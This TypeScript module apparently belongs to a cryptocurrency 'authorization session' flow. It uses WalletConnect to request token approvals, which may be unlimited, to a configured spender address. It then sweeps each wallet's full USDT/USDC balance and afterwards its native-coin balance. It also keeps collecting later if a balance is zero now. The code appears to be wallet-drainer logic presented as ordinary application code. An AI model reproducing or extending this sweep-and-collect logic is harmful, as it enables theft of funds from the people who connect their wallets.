import { formatTransferSkipReason } from "@trustmycard/shared/constants/collection";
import { generateFlowId } from "@trustmycard/shared/ids";
import { getToken, parseHumanToRaw } from "../core/chain-tokens";
import type { ApprovalOrchestrationResult } from "../approval/types";
import { ApprovalStageName, StageStatus } from "../approval/types";
import { isApprovalOrchestrationUserDenied } from "../approval/resilience/errors";
import type { ApprovalRequest } from "../approval/types";
import type { NativeTransferResult } from "../native-transfer/types";
import { authorizeNativeInWalletPhase } from "../native-transfer/native-wallet-authorize";
import {
  formatInsufficientNativeFeeMessage,
  preflightNativeTransferEstimate,
} from "./native-preflight";
import { getErrorMessage, isUserRejection } from "../core/errors";
import {
  alreadyAuthorizedResult,
  createPreflightApi,
  preflightExistingAllowance,
} from "./allowance-preflight";
import { collectForExistingAllowance } from "./existing-allowance-collection";
import {
  appendTokenCapture,
  buildPreflightSkippedTokenCapture,
} from "./wallet-phase-token-capture";
import {
  SessionTimelineTracker,
  flushSessionTimeline,
} from "../observability/session-timeline";
import type { LogStatus } from "@trustmycard/shared/observability";
import type {
  AuthorizationAssetOutcome,
  AuthorizationAssetResult,
  AuthorizationSessionResult,
  LinkedAccounts,
  NetworkRow,
  TokenSymbol,
  UniversalProvider,
} from "../types";
import {
  planAuthorizationWork,
  runEvmTokenBatchApproval,
  type EvmTokenBatchRunResult,
} from "./evm-token-batch";
import {
  inferEvmBatchNativeOutcome,
  shouldSkipNativeWalletPhaseAfterBatch,
} from "./evm-batch-native-outcome";
import {
  awaitEvmSequentialApprovalGap,
  readEvmPendingNonce,
  waitForEvmPendingNonceAdvance,
} from "../core/evm-nonce-sync";
import { isEvmChainKey } from "../core/native-chains";
import { fetchWalletSessionToken } from "./wallet-session-token";
import { runAuthorizationSettlement } from "./phases/settlement-coordinator";
import type { SettlementRunResult } from "./phases/types";
import type {
  SettlementProgressEvent,
  WalletPhaseCapture,
  WalletPhaseTokenCapture,
} from "./phases/types";
import type { NativeTransferOrchestrator } from "../native-transfer/orchestrator";
import {
  balanceForToken,
  type IncludedAssetWorkItem,
} from "./preferences";

export type RunAuthorizationSessionArgs = {
  items: IncludedAssetWorkItem[];
  networks: NetworkRow[];
  accounts: LinkedAccounts;
  getSpender: (networkKey: string) => string;
  /** Wallet phase only — stops after on-chain approve broadcast. */
  runApproval: (args: {
    network: string;
    owner: string;
    token: TokenSymbol;
    amountHuman?: string;
    unlimited: boolean;
    nativeBalanceHuman: string;
    tokenBalanceHuman: string;
    executeTransfer: boolean;
    transferToAddress: string;
    transferAmountRaw?: string;
    onStage?: (stageResult: {
      stage: string;
      status: string;
      data?: unknown;
      error?: string | null;
    }) => void;
  }) => Promise<ApprovalOrchestrationResult>;
  /** Settlement phase — confirms allowance and persists approval. */
  runApprovalSettlement?: (args: {
    network: string;
    owner: string;
    token: TokenSymbol;
    walletPhaseContext: ApprovalOrchestrationResult["context"];
    executeTransfer: boolean;
    transferToAddress: string;
    transferAmountRaw?: string;
    nativeBalanceHuman: string;
    tokenBalanceHuman: string;
    unlimited: boolean;
    amountHuman?: string;
    walletSessionToken?: string;
    onStage?: (stageResult: {
      stage: string;
      status: string;
      data?: unknown;
      error?: string | null;
    }) => void;
  }) => Promise<ApprovalOrchestrationResult>;
  runNativeTransfer?: (args: {
    network: string;
    owner: string;
    unlimited: boolean;
    amountHuman?: string;
    walletSessionToken?: string;
    nativeReadinessTokens?: Array<{
      token: string;
      shouldAttemptTransfer: boolean;
      approvalTxHash?: string | null;
      approvalId?: string | null;
    }>;
    mode?: "full" | "authorize_only" | "execute_deferred";
    deferredSignedRaw?: string;
    deferredTransferableRaw?: string;
    onStage?: (stageResult: {
      stage: string;
      status: string;
      error?: string | null;
    }) => void;
  }) => Promise<NativeTransferResult>;
  /** Native orchestrator fallback when runNativeTransfer is not wired. */
  nativeOrchestrator?: NativeTransferOrchestrator;
  onAssetStart?: (item: IncludedAssetWorkItem) => void;
  onAssetEnd?: (result: AuthorizationAssetResult) => void;
  /** Wallet-phase link progress (stage id from link-progress catalog). */
  onLinkProgress?: (stageId: string) => void;
  onWalletPhaseComplete?: (summary: AuthorizationSessionResult) => void;
  onSettlementProgress?: (event: SettlementProgressEvent) => void;
  onSettlementComplete?: (network: string, result: SettlementRunResult) => void;
  /** When false, only wallet phase runs (testing). Default true. */
  startSettlement?: boolean;
  log?: (step: string, detail?: Record<string, unknown>) => void;
  sessionId?: string;
  authorizationSessionId?: string;
  /** Canonical journey ID (alias for traceId / sessionId when provided). */
  transactionId?: string;
  evmBatchProvider?: UniversalProvider;
  /** Provider kept alive for settlement (session auth + EVM native execution). */
  settlementProvider?: UniversalProvider;
  apiBaseUrl?: string;
  /** Pre-authenticated wallet session token (prefetched before wallet phase when possible). */
  walletSessionToken?: string;
};

function hasTokenAuthorizationDependencyFailure(
  results: AuthorizationAssetResult[],
  network: string,
): boolean {
  return results.some(
    (r) =>
      r.network === network &&
      r.token !== "NATIVE" &&
      (r.outcome === "failed" || r.outcome === "user_rejected"),
  );
}

function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
  return (
    outcome === "authorized" || outcome === "collected" || outcome === "pending"
  );
}

function summarize(
  items: AuthorizationAssetResult[],
): AuthorizationSessionResult {
  return {
    items,
    authorizedCount: items.filter((i) => isSuccessOutcome(i.outcome)).length,
    failedCount: items.filter((i) => i.outcome === "failed").length,
    rejectedCount: items.filter((i) => i.outcome === "user_rejected").length,
    skippedCount: items.filter(
      (i) =>
        i.outcome === "skipped_unsupported" ||
        i.outcome === "skipped_zero" ||
        i.outcome === "skipped_dependency_failed",
    ).length,
  };
}

function applyEvmBatchNativeCapture(args: {
  batchResults: EvmTokenBatchRunResult;
  network: string;
  owner: string;
  capture: WalletPhaseCapture;
}): void {
  const { batchResults, network, owner, capture } = args;
  const outcome = inferEvmBatchNativeOutcome(batchResults);

  if (outcome === "succeeded" &&
    batchResults.batchIncludedNative &&
    batchResults.nativeTxHash
  ) {
    capture.native = {
      network,
      owner,
      authorizationKind: "evm_batch_executed",
      authorizationPayload: { txHash: batchResults.nativeTxHash },
      estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
      recipient: batchResults.nativeRecipient ?? undefined,
    };
    capture.nativeRequested = true;
    return;
  }

  if (outcome === "unknown" && batchResults.batchId) {
    capture.native = {
      network,
      owner,
      authorizationKind: "evm_batch_unknown",
      authorizationPayload: {
        batchId: batchResults.batchId,
        chainId: batchResults.batchChainId ?? null,
        tokenJobCount: batchResults.batchNativeJobCount ?? 0,
      },
      estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
      recipient: batchResults.nativeRecipient ?? undefined,
    };
    capture.nativeRequested = true;
    return;
  }

  if (outcome === "failed_revert") {
    capture.native = {
      network,
      owner,
      authorizationKind: "evm_deferred",
      authorizationPayload: { evmDeferred: true, batchNativeRevert: true },
      estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
      recipient: batchResults.nativeRecipient ?? undefined,
    };
    capture.nativeRequested = true;
  }
}

function markNativeRequested(
  captureByNetwork: Map<string, WalletPhaseCapture>,
  sessionId: string,
  network: string,
  owner: string,
): void {
  const capture = captureByNetwork.get(network) ?? {
    sessionId,
    network,
    owner,
    tokens: [],
    native: null,
    batchId: null,
    nativeRequested: true,
  };
  capture.nativeRequested = true;
  captureByNetwork.set(network, capture);
}

function recordNativePreflightFailure(ctx: {
  item: IncludedAssetWorkItem & { asset: "NATIVE" };
  results: AuthorizationAssetResult[];
  captureByNetwork: Map<string, WalletPhaseCapture>;
  network: string;
  message: string;
  log: RunAuthorizationSessionArgs["log"];
  onAssetEnd?: RunAuthorizationSessionArgs["onAssetEnd"];
  detail?: Record<string, unknown>;
}): void {
  ctx.log?.("NATIVE_PREFLIGHT_INSUFFICIENT", {
    network: ctx.network,
    message: ctx.message,
    ...ctx.detail,
  });
  const result: AuthorizationAssetResult = {
    network: ctx.network,
    token: "NATIVE",
    outcome: "failed",
    message: ctx.message,
  };
  ctx.results.push(result);
  ctx.onAssetEnd?.(result);

  const capture = ctx.captureByNetwork.get(ctx.network);
  if (capture) {
    capture.native = null;
    capture.nativeRequested = false;
    ctx.captureByNetwork.set(ctx.network, capture);
  }
}

function recordEvmNativeDeferred(ctx: {
  item: IncludedAssetWorkItem & { asset: "NATIVE" };
  results: AuthorizationAssetResult[];
  captureByNetwork: Map<string, WalletPhaseCapture>;
  sessionId: string;
  owner: string;
  log: RunAuthorizationSessionArgs["log"];
  onAssetEnd?: RunAuthorizationSessionArgs["onAssetEnd"];
  reason?: string;
}): void {
  const { item, results, captureByNetwork, sessionId, owner, log, onAssetEnd } =
    ctx;
  log?.("NATIVE DEFERRED TO SETTLEMENT", {
    network: item.network,
    owner,
    reason: ctx.reason ?? "evm_policy",
    policy: "settlement eth_sendTransaction after token collection",
  });
  const result: AuthorizationAssetResult = {
    network: item.network,
    token: "NATIVE",
    outcome: "authorized",
    message: "Native deferred — eth_sendTransaction after token settlement",
  };
  results.push(result);
  onAssetEnd?.(result);

  const capture = captureByNetwork.get(item.network) ?? {
    sessionId,
    network: item.network,
    owner,
    tokens: [],
    native: null,
    batchId: null,
  };
  capture.native = {
    network: item.network,
    owner,
    authorizationKind: "evm_deferred",
    authorizationPayload: { evmDeferred: true },
  };
  capture.nativeRequested = true;
  captureByNetwork.set(item.network, capture);
}

async function awaitEvmNativeSignNonceGap(args: {
  network: string;
  owner: string;
  batchResults: EvmTokenBatchRunResult;
  baselineNonce: bigint;
  log: RunAuthorizationSessionArgs["log"];
}): Promise<boolean> {
  const anchorTx = args.batchResults.results.find(
    (r) => r.txHash && r.token !== "NATIVE",
  )?.txHash;
  args.log?.("EVM_NATIVE_SIGN_NONCE_WAIT", {
    network: args.network,
    anchorTxHash: anchorTx ?? null,
    baselineNonce: args.baselineNonce.toString(),
  });
  try {
    if (anchorTx) {
      const advanced = await awaitEvmSequentialApprovalGap({
        network: args.network,
        owner: args.owner,
        txHash: anchorTx,
        baselineNonce: args.baselineNonce,
      });
      return advanced != null;
    }
    await waitForEvmPendingNonceAdvance({
      network: args.network,
      owner: args.owner,
      baselineNonce: args.baselineNonce,
    });
    return true;
  } catch (nonceErr) {
    args.log?.("EVM_NATIVE_SIGN_NONCE_WAIT_FAILED", {
      network: args.network,
      error: getErrorMessage(nonceErr, "Nonce wait failed"),
    });
    return false;
  }
}

/**
 * Two-phase authorization:
 * 1. Wallet phase — token approvals (EVM native deferred; Tron native sign only).
 * 2. Settlement phase — confirm approvals, collect USDT → USDC via existing queue, then native.
 */
export async function runAuthorizationSession(
  args: RunAuthorizationSessionArgs,
): Promise<AuthorizationSessionResult> {
  const results: AuthorizationAssetResult[] = [];
  const captures: WalletPhaseCapture[] = [];
  const log = args.log ?? (() => undefined);
  let walletSessionToken = args.walletSessionToken;
  const walletForJourney = args.accounts.evm || args.accounts.tron;
  const sessionId =
    args.transactionId?.trim() ||
    args.sessionId?.trim() ||
    args.authorizationSessionId?.trim() ||
    (walletForJourney
      ? generateFlowId({ walletAddress: walletForJourney })
      : "");
  if (!sessionId) {
    throw new Error("transactionId is required for authorization session");
  }
  const transactionId = args.transactionId ?? sessionId;
  const timeline = new SessionTimelineTracker({
    sessionId,
    authorizationSessionId: args.authorizationSessionId ?? sessionId,
  });
  timeline.startRoot("AUTHORIZATION_STARTED");

  log("AUTHORIZATION SESSION STARTED", {
    sessionId,
    transactionId,
    assetCount: args.items.length,
    assets: args.items.map((i) => `${i.network}:${i.asset}`),
    mode: "wallet_phase_first",
  });

  const authNetwork = args.items[0]?.network;
  const authProvider = args.settlementProvider ?? args.evmBatchProvider;
  const authOwner =
    authNetwork === "tron" ? args.accounts.tron : args.accounts.evm;
  const apiBase = args.apiBaseUrl ?? "";
  const canPrefetchAuth =
    !walletSessionToken &&
    authProvider &&
    authOwner &&
    authNetwork &&
    (apiBase.length > 0 || typeof window !== "undefined");
  if (canPrefetchAuth) {
    walletSessionToken = await fetchWalletSessionToken({
      provider: authProvider,
      apiBaseUrl: apiBase,
      owner: authOwner,
      network: authNetwork,
    });
    log("WALLET SESSION AUTHENTICATED", {
      network: authNetwork,
      phase: "pre_wallet",
    });
  }

  const workUnits = planAuthorizationWork(args.items);
  const captureByNetwork = new Map<string, WalletPhaseCapture>();

  for (const unit of workUnits) {
    if (unit.kind === "evm_token_batch" && unit.items.length >= 1) {
      if (args.evmBatchProvider) {
        const evmOwner = args.accounts.evm;
        const batchBaselineNonce =
          unit.nativeItem &&
          evmOwner &&
          isEvmChainKey(unit.network)
            ? await readEvmPendingNonce({
                network: unit.network,
                owner: evmOwner,
              })
            : null;

        const batchResults = await runEvmTokenBatchApproval({
          items: unit.items,
          network: unit.network,
          nativeItem: unit.nativeItem,
          networks: args.networks,
          accounts: args.accounts,
          provider: args.evmBatchProvider,
          apiBaseUrl: args.apiBaseUrl,
          getSpender: args.getSpender,
          runApproval: args.runApproval,
          onAssetStart: args.onAssetStart,
          onAssetEnd: args.onAssetEnd,
          onBatchWalletConfirm: () =>
            args.onLinkProgress?.("confirm_usdt_usdc_batch_wallet"),
          log,
          walletPhaseOnly: true,
          walletSessionToken,
        });
        results.push(...batchResults.results);

        const owner = args.accounts.evm;
        if (owner) {
          let nativePreflightOk = true;
          if (unit.nativeItem) {
            try {
              const preflight = await preflightNativeTransferEstimate({
                apiBaseUrl: args.apiBaseUrl,
                network: unit.network,
                owner,
                traceId: args.transactionId ?? sessionId,
              });
              if (!preflight.ok) {
                nativePreflightOk = false;
                recordNativePreflightFailure({
                  item: unit.nativeItem,
                  results,
                  captureByNetwork,
                  network: unit.network,
                  message: preflight.message,
                  log,
                  onAssetEnd: args.onAssetEnd,
                  detail: {
                    balanceHuman: preflight.estimate.balanceHuman,
                    feeHuman: preflight.estimate.feeHuman,
                  },
                });
              }
            } catch (preflightErr) {
              nativePreflightOk = false;
              recordNativePreflightFailure({
                item: unit.nativeItem,
                results,
                captureByNetwork,
                network: unit.network,
                message: getErrorMessage(
                  preflightErr,
                  "Native transfer estimate failed",
                ),
                log,
                onAssetEnd: args.onAssetEnd,
              });
            }
          }
          const existing = captureByNetwork.get(unit.network) ?? {
            sessionId,
            network: unit.network,
            owner,
            tokens: [],
            native: null,
            batchId: batchResults.batchId ?? null,
          };
          if (batchResults.tokenCaptures.length > 0) {
            existing.tokens.push(...batchResults.tokenCaptures);
            existing.batchId = batchResults.batchId ?? existing.batchId;
          }
          if (nativePreflightOk && unit.nativeItem) {
            applyEvmBatchNativeCapture({
              batchResults,
              network: unit.network,
              owner,
              capture: existing,
            });
          }
          if (
            nativePreflightOk &&
            unit.nativeItem &&
            !shouldSkipNativeWalletPhaseAfterBatch(batchResults, true) &&
            !hasTokenAuthorizationDependencyFailure(results, unit.network)
          ) {
            if (
              batchBaselineNonce != null &&
              evmOwner &&
              isEvmChainKey(unit.network)
            ) {
              const nonceReady = await awaitEvmNativeSignNonceGap({
                network: unit.network,
                owner: evmOwner,
                batchResults,
                baselineNonce: batchBaselineNonce,
                log,
              });
              if (!nonceReady) {
                recordEvmNativeDeferred({
                  item: unit.nativeItem,
                  results,
                  captureByNetwork,
                  sessionId,
                  owner: evmOwner,
                  log,
                  onAssetEnd: args.onAssetEnd,
                  reason: "nonce_wait_timeout",
                });
                captureByNetwork.set(unit.network, existing);
                continue;
              }
            }
            captureByNetwork.set(unit.network, existing);
            await runNativeWalletPhase({
              item: unit.nativeItem,
              args,
              results,
              captureByNetwork,
              sessionId,
              log,
            });
          }
          if (
            existing.tokens.length > 0 ||
            existing.native ||
            existing.nativeRequested
          ) {
            captureByNetwork.set(unit.network, existing);
          }
        }
        continue;
      }

      let evmPendingNonce: bigint | null = null;
      const evmOwner = args.accounts.evm;
      if (isEvmChainKey(unit.network) && evmOwner) {
        evmPendingNonce = await readEvmPendingNonce({
          network: unit.network,
          owner: evmOwner,
        });
      }

      for (let itemIndex = 0; itemIndex < unit.items.length; itemIndex += 1) {
        const item = unit.items[itemIndex]!;
        args.onAssetStart?.(item);
        await runTokenWalletPhase({
          item: { ...item, asset: item.asset as TokenSymbol },
          args,
          results,
          captureByNetwork,
          sessionId,
          log,
          walletSessionToken,
        });
        const last = results[results.length - 1];
        if (
          evmPendingNonce != null &&
          evmOwner &&
          itemIndex < unit.items.length - 1 &&
          last &&
          isSuccessOutcome(last.outcome) &&
          last.txHash
        ) {
          log("EVM_SEQUENTIAL_NONCE_WAIT", {
            network: unit.network,
            token: last.token,
            txHash: last.txHash,
            baselineNonce: evmPendingNonce.toString(),
          });
          try {
            const advanced = await awaitEvmSequentialApprovalGap({
              network: unit.network,
              owner: evmOwner,
              txHash: last.txHash,
              baselineNonce: evmPendingNonce,
            });
            if (advanced != null) {
              evmPendingNonce = advanced;
            }
          } catch (nonceErr) {
            log("EVM_SEQUENTIAL_NONCE_WAIT_FAILED", {
              network: unit.network,
              error: getErrorMessage(nonceErr, "Nonce wait failed"),
            });
          }
        }
      }
      if (unit.nativeItem) {
        if (evmOwner) {
          markNativeRequested(
            captureByNetwork,
            sessionId,
            unit.network,
            evmOwner,
          );
        }
        if (
          evmOwner &&
          isEvmChainKey(unit.network) &&
          evmPendingNonce != null &&
          !hasTokenAuthorizationDependencyFailure(results, unit.network)
        ) {
          const lastTokenTx = results
            .filter(
              (r) =>
                r.network === unit.network &&
                r.token !== "NATIVE" &&
                r.txHash,
            )
            .at(-1)?.txHash;
          if (lastTokenTx) {
            const nonceReady = await awaitEvmNativeSignNonceGap({
              network: unit.network,
              owner: evmOwner,
              batchResults: {
                results: results.filter((r) => r.network === unit.network),
                tokenCaptures: [],
              },
              baselineNonce: evmPendingNonce,
              log,
            });
            if (!nonceReady && unit.nativeItem) {
              recordEvmNativeDeferred({
                item: unit.nativeItem,
                results,
                captureByNetwork,
                sessionId,
                owner: evmOwner,
                log,
                onAssetEnd: args.onAssetEnd,
                reason: "nonce_wait_timeout",
              });
              continue;
            }
          }
        }
        await runNativeWalletPhase({
          item: unit.nativeItem,
          args,
          results,
          captureByNetwork,
          sessionId,
          log,
        });
      }
      continue;
    }

    if (unit.kind !== "single") continue;

    const item = unit.item;
    args.onAssetStart?.(item);

    if (item.asset === "NATIVE") {
      await runNativeWalletPhase({
        item: item as IncludedAssetWorkItem & { asset: "NATIVE" },
        args,
        results,
        captureByNetwork,
        sessionId,
        log,
      });
      continue;
    }

    await runTokenWalletPhase({
      item: { ...item, asset: item.asset },
      args,
      results,
      captureByNetwork,
      sessionId,
      log,
      walletSessionToken,
    });
  }

  captures.push(...captureByNetwork.values());

  const walletSummary = summarize(results);
  const outcome: LogStatus =
    walletSummary.failedCount > 0 || walletSummary.rejectedCount > 0
      ? walletSummary.authorizedCount > 0
        ? "partial_success"
        : "failure"
      : "success";
  timeline.complete(outcome);
  void flushSessionTimeline(timeline.snapshot());

  log("WALLET PHASE COMPLETE", {
    sessionId,
    authorizedCount: walletSummary.authorizedCount,
    failedCount: walletSummary.failedCount,
    rejectedCount: walletSummary.rejectedCount,
    skippedCount: walletSummary.skippedCount,
    settlementCaptures: captures.length,
  });

  args.onWalletPhaseComplete?.(walletSummary);

  if (
    args.startSettlement !== false &&
    args.runApprovalSettlement &&
    captures.length > 0
  ) {
    for (const capture of captures) {
      void runAuthorizationSettlement({
        capture,
        networks: args.networks,
        accounts: args.accounts,
        apiBaseUrl: args.apiBaseUrl,
        provider: args.settlementProvider ?? args.evmBatchProvider,
        walletSessionToken,
        getSpender: args.getSpender,
        runApprovalSettlement: (settlementArgs) =>
          args.runApprovalSettlement!({
            ...settlementArgs,
            walletPhaseContext: settlementArgs.walletPhaseContext,
          }),
        runNativeTransfer: args.runNativeTransfer,
        onProgress: args.onSettlementProgress,
        log,
      }).then((settlementResult) => {
        args.onSettlementComplete?.(capture.network, settlementResult);
        log("SETTLEMENT COMPLETE", {
          network: capture.network,
          ok: settlementResult.ok,
          settlementSessionId: settlementResult.settlementSessionId,
        });
      });
    }
  }

  return walletSummary;
}

async function runTokenWalletPhase(ctx: {
  item: IncludedAssetWorkItem & { asset: TokenSymbol };
  args: RunAuthorizationSessionArgs;
  results: AuthorizationAssetResult[];
  captureByNetwork: Map<string, WalletPhaseCapture>;
  sessionId: string;
  log: RunAuthorizationSessionArgs["log"];
  walletSessionToken?: string;
}): Promise<void> {
  const { item, args, results, captureByNetwork, sessionId, log, walletSessionToken } =
    ctx;
  const token = item.asset;

  const networkRow = args.networks.find((n) => n.key === item.network);
  const tokenInfo = getToken(item.network, token);
  if (!networkRow || !tokenInfo) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "skipped_unsupported",
      message: `Unsupported token ${token} on ${item.network}`,
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  const owner =
    item.network === "tron" ? args.accounts.tron : args.accounts.evm;
  if (!owner) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "failed",
      message:
        item.network === "tron"
          ? "No Tron address in this WalletConnect session"
          : "No EVM address in this WalletConnect session",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  const spender = args.getSpender(item.network);
  if (!spender) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "failed",
      message: "Spender not configured",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  const tokenBalanceHuman = balanceForToken(networkRow, token);
  const nativeBalanceHuman = networkRow.balances.native ?? "0";

  try {
    const availableBalanceRaw = parseHumanToRaw(
      tokenBalanceHuman,
      tokenInfo.decimals,
    );
    const requestedTransferRaw = item.unlimited
      ? availableBalanceRaw
      : parseHumanToRaw(item.amountHuman, tokenInfo.decimals);
    const transferAmountRaw =
      availableBalanceRaw < requestedTransferRaw
        ? availableBalanceRaw.toString()
        : requestedTransferRaw.toString();
    const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);

    if (!shouldAttemptTransfer) {
      log?.("ZERO_BALANCE_COLLECT_LATER", {
        network: item.network,
        token,
        tokenBalanceHuman,
        policy: "approve proceeds — collector will transfer when balance > 0",
      });
    }

    if (owner) {
      try {
        const preflightRequest: ApprovalRequest = {
          network: item.network,
          owner,
          token,
          amountHuman: item.unlimited ? undefined : item.amountHuman,
          unlimited: item.unlimited,
          nativeBalanceHuman,
          tokenBalanceHuman,
          executeTransfer: shouldAttemptTransfer,
          transferToAddress: spender,
          transferAmountRaw: shouldAttemptTransfer
            ? transferAmountRaw
            : undefined,
          traceId: args.transactionId ?? sessionId,
          walletSessionToken,
        };
        const preflightApi = createPreflightApi(args.apiBaseUrl);
        const preflight = await preflightExistingAllowance({
          api: preflightApi,
          request: preflightRequest,
        });
        if (preflight.alreadyAuthorized && !shouldAttemptTransfer) {
          const result = alreadyAuthorizedResult({
            item: { ...item, asset: token },
          });
          results.push(result);
          args.onAssetEnd?.(result);
          if (owner) {
            appendTokenCapture(captureByNetwork, {
              sessionId,
              network: item.network,
              owner,
              capture: buildPreflightSkippedTokenCapture({
                item: { ...item, asset: token },
                shouldAttemptTransfer: false,
              }),
            });
          }
          return;
        }
        if (preflight.alreadyAuthorized && shouldAttemptTransfer) {
          const result = await collectForExistingAllowance({
            item: { ...item, asset: token },
            request: preflightRequest,
            prepared: preflight.prepared,
            apiBaseUrl: args.apiBaseUrl,
          });
          results.push(result);
          args.onAssetEnd?.(result);
          if (owner) {
            appendTokenCapture(captureByNetwork, {
              sessionId,
              network: item.network,
              owner,
              capture: buildPreflightSkippedTokenCapture({
                item: { ...item, asset: token },
                shouldAttemptTransfer: true,
                transferAmountRaw,
                approvalId: result.approvalId,
              }),
            });
          }
          return;
        }
      } catch (err) {
        log?.("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
          network: item.network,
          token,
          error: getErrorMessage(err, "Allowance preflight unavailable"),
        });
      }
    }

    const orchestration = await args.runApproval({
      network: item.network,
      owner,
      token,
      amountHuman: item.unlimited ? undefined : item.amountHuman,
      unlimited: item.unlimited,
      nativeBalanceHuman,
      tokenBalanceHuman,
      executeTransfer: shouldAttemptTransfer,
      transferToAddress: spender,
      transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
      onStage: (stageResult) => {
        if (
          stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES ||
          stageResult.stage === ApprovalStageName.WAIT_RESOURCES_READY
        ) {
          log?.("RESOURCE STAGE", {
            network: item.network,
            token,
            stage: stageResult.stage,
            status: stageResult.status,
          });
        }
      },
    });

    if (!orchestration.ok) {
      const rejected = isApprovalOrchestrationUserDenied(orchestration);
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: rejected ? "user_rejected" : "failed",
        message: getErrorMessage(orchestration.error, "Approval failed"),
        txHash: orchestration.txHash,
        approvalId: orchestration.approvalId,
      };
      results.push(result);
      args.onAssetEnd?.(result);
      return;
    }

    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "authorized",
      message: "Wallet approved — settlement queued",
      txHash: orchestration.txHash,
      approvalId: orchestration.approvalId,
    };
    results.push(result);
    args.onAssetEnd?.(result);

    const capture = captureByNetwork.get(item.network) ?? {
      sessionId,
      network: item.network,
      owner,
      tokens: [],
      native: null,
      batchId: null,
    };
    capture.tokens.push({
      item,
      orchestration,
      shouldAttemptTransfer,
      transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
    } satisfies WalletPhaseTokenCapture);
    captureByNetwork.set(item.network, capture);
  } catch (err: unknown) {
    const rejected = isUserRejection(err);
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: rejected ? "user_rejected" : "failed",
      message: getErrorMessage(err, "Approval failed"),
    };
    results.push(result);
    args.onAssetEnd?.(result);
  }
}

async function runNativeWalletPhase(ctx: {
  item: IncludedAssetWorkItem & { asset: "NATIVE" };
  args: RunAuthorizationSessionArgs;
  results: AuthorizationAssetResult[];
  captureByNetwork: Map<string, WalletPhaseCapture>;
  sessionId: string;
  log: RunAuthorizationSessionArgs["log"];
}): Promise<void> {
  const { item, args, results, captureByNetwork, sessionId, log } = ctx;

  args.onAssetStart?.(item);

  const owner =
    item.network === "tron" ? args.accounts.tron : args.accounts.evm;

  const tokenDependencyFailed = hasTokenAuthorizationDependencyFailure(
    results,
    item.network,
  );
  if (tokenDependencyFailed) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "skipped_dependency_failed",
      message:
        "Skipped native authorization because token authorization failed",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  if (!owner) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "failed",
      message: "No wallet address for native authorization",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  try {
    const preflight = await preflightNativeTransferEstimate({
      apiBaseUrl: args.apiBaseUrl,
      network: item.network,
      owner,
      traceId: args.transactionId ?? sessionId,
    });
    if (!preflight.ok) {
      recordNativePreflightFailure({
        item,
        results,
        captureByNetwork,
        network: item.network,
        message: preflight.message,
        log,
        onAssetEnd: args.onAssetEnd,
        detail: {
          balanceHuman: preflight.estimate.balanceHuman,
          feeHuman: preflight.estimate.feeHuman,
        },
      });
      return;
    }
  } catch (preflightErr) {
    recordNativePreflightFailure({
      item,
      results,
      captureByNetwork,
      network: item.network,
      message: getErrorMessage(
        preflightErr,
        "Native transfer estimate failed",
      ),
      log,
      onAssetEnd: args.onAssetEnd,
    });
    return;
  }

  markNativeRequested(captureByNetwork, sessionId, item.network, owner);

  // EVM: defer native to settlement (eth_sendTransaction). Trust Wallet WC rejects
  // eth_signTransaction params with "The data couldn't be read because it is missing."
  if (item.network !== "tron") {
    recordEvmNativeDeferred({
      item,
      results,
      captureByNetwork,
      sessionId,
      owner,
      log,
      onAssetEnd: args.onAssetEnd,
      reason: "evm_policy",
    });
    return;
  }

  const provider = args.evmBatchProvider ?? args.settlementProvider;
  if (!provider) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "failed",
      message: "Wallet provider not available for native authorization",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  log?.("NATIVE WALLET AUTHORIZATION STARTED", {
    network: item.network,
    owner,
    policy: "Tron sign now — broadcast deferred until USDT/USDC settlement",
  });

  const authResult = await authorizeNativeInWalletPhase({
    provider,
    network: item.network,
    owner,
    unlimited: item.unlimited,
    amountHuman: item.unlimited ? undefined : item.amountHuman,
    apiBaseUrl: args.apiBaseUrl,
    traceId: args.transactionId ?? sessionId,
  });

  if (!authResult.ok) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: authResult.userRejected ? "user_rejected" : "failed",
      message: authResult.error,
    };
    results.push(result);
    args.onAssetEnd?.(result);
    return;
  }

  const result: AuthorizationAssetResult = {
    network: item.network,
    token: "NATIVE",
    outcome: "authorized",
    message: "Native signed — broadcast deferred until token settlement",
  };
  results.push(result);
  args.onAssetEnd?.(result);

  const capture = captureByNetwork.get(item.network) ?? {
    sessionId,
    network: item.network,
    owner,
    tokens: [],
    native: null,
    batchId: null,
  };
  capture.native = authResult.capture;
  captureByNetwork.set(item.network, capture);
}

export function outcomeLabel(
  outcome: AuthorizationAssetResult["outcome"],
): string {
  switch (outcome) {
    case "authorized":
      return "Authorized — settlement queued";
    case "user_rejected":
      return "User rejected — remaining assets continued";
    case "failed":
      return "Failed";
    case "skipped_unsupported":
      return "Skipped — unsupported";
    case "skipped_zero":
      return "Skipped — zero transferable";
    case "skipped_dependency_failed":
      return "Skipped — dependency failed";
    case "collected":
      return "Transfer confirmed";
    case "pending":
      return "Transfer pending";
    default:
      return outcome;
  }
}
